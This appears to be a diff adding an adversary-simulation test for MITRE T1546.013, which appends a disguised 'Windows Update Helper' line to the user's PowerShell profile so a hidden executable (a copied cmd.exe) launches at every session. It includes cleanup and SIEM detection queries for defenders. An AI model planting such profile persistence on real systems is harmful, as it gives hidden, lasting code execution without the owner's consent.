@@ -1,0 +1,114 @@
+id: T1546.013_event_triggered_execution_powershell_profile
+name: "Event Triggered Execution — PowerShell Profile"
+mitre_technique: "T1546.013"
+mitre_tactic: "persistence"
+description: >
+  Adversaries add malicious code to PowerShell profile scripts that execute
+  automatically every time a PowerShell session starts. Profile locations:
+  $PROFILE.CurrentUserCurrentHost — %USERPROFILE%\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+  $PROFILE.AllUsersAllHosts — %SystemRoot%\System32\WindowsPowerShell\v1.0\profile.ps1
+  The current-user profile requires no elevation, making this an attractive low-privilege
+  persistence mechanism. Any PowerShell usage by the victim (including admin tasks)
+  triggers the malicious profile code.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1546/013/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1546.013 — PowerShell Profile persistence simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Inspect current profile paths and content"
+    command: |
+      Write-Host "[PAS] PowerShell profile locations:"
+      @($PROFILE.CurrentUserCurrentHost,
+        $PROFILE.CurrentUserAllHosts,
+        $PROFILE.AllUsersCurrentHost,
+        $PROFILE.AllUsersAllHosts) | ForEach-Object {
+          $exists = Test-Path $_
+          Write-Host "  $_ — Exists: $exists"
+          if ($exists) {
+              $content = Get-Content $_ -Raw -ErrorAction SilentlyContinue
+              Write-Host "    Content: $(if ($content) { $content.Substring(0,[Math]::Min(80,$content.Length)) } else { '(empty)' })"
+          }
+      }
+
+  - step: 3
+    type: exec_powershell
+    description: "Add malicious code to current user PowerShell profile"
+    command: |
+      $profilePath = $PROFILE.CurrentUserCurrentHost
+      $profileDir  = Split-Path $profilePath
+
+      if (-not (Test-Path $profileDir)) {
+          New-Item -ItemType Directory $profileDir -Force | Out-Null
+      }
+
+      # Save original content
+      $originalContent = if (Test-Path $profilePath) {
+          Get-Content $profilePath -Raw -ErrorAction SilentlyContinue
+      } else { "" }
+
+      # Append malicious persistence code
+      $malCode = "`n# PAS_T1546_013 - Windows Update Helper`nStart-Process -WindowStyle Hidden `"$env:TEMP\PAS_T1546_013_payload.exe`" -ErrorAction SilentlyContinue`n"
+      Add-Content $profilePath $malCode -Encoding UTF8
+      Write-Host "[PAS] Malicious code appended to: $profilePath"
+      Write-Host "[PAS] Executes every time PowerShell opens"
+
+      # Store original for cleanup
+      Set-Content "$env:TEMP\PAS_T1546_013_profile_backup.txt" $originalContent -Encoding UTF8
+
+      # Create dummy payload
+      Copy-Item "$env:SystemRoot\System32\cmd.exe" "$env:TEMP\PAS_T1546_013_payload.exe" -Force
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — write to profile.ps1 path, script block logging shows profile-injected code at session start"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Restore original profile and remove payload"
+    command: |
+      $profilePath  = $PROFILE.CurrentUserCurrentHost
+      $backupPath   = "$env:TEMP\PAS_T1546_013_profile_backup.txt"
+      $originalContent = Get-Content $backupPath -Raw -ErrorAction SilentlyContinue
+
+      if ($null -ne $originalContent -and $originalContent.Trim() -ne "") {
+          Set-Content $profilePath $originalContent -Encoding UTF8
+          Write-Host "[PAS][Cleanup] Profile restored to original content"
+      } else {
+          # Profile didn't exist before — remove our file
+          Remove-Item $profilePath -Force -ErrorAction SilentlyContinue
+          Write-Host "[PAS][Cleanup] Profile file removed (did not exist before)"
+      }
+      Remove-Item "$env:TEMP\PAS_T1546_013_payload.exe" -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:TEMP\PAS_T1546_013_profile_backup.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Profile persistence removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1546.013 cleanup complete"
+
+analyst_checklist:
+  - "File event: write to Microsoft.PowerShell_profile.ps1 by non-PowerShell process"
+  - "Script block logging (4104): unexpected commands executing at PowerShell session start"
+  - "Sentinel: DeviceFileEvents | where FileName contains 'profile.ps1' and ActionType == 'FileModified'"
+  - "Sentinel: DeviceFileEvents | where FolderPath contains 'WindowsPowerShell' and ActionType in ('FileCreated','FileModified')"
+  - "MDE alert: 'PowerShell profile modified'"
+  - "CONTROL CHECK: Baseline all PowerShell profile files — alert on any modification"
+  - "CONTROL CHECK: GPO: set PowerShell Execution Policy to AllSigned — unsigned profile code will not run"
+  - "CONTROL CHECK: AMSI scans profile code at each session start — malicious code in profiles is detected"
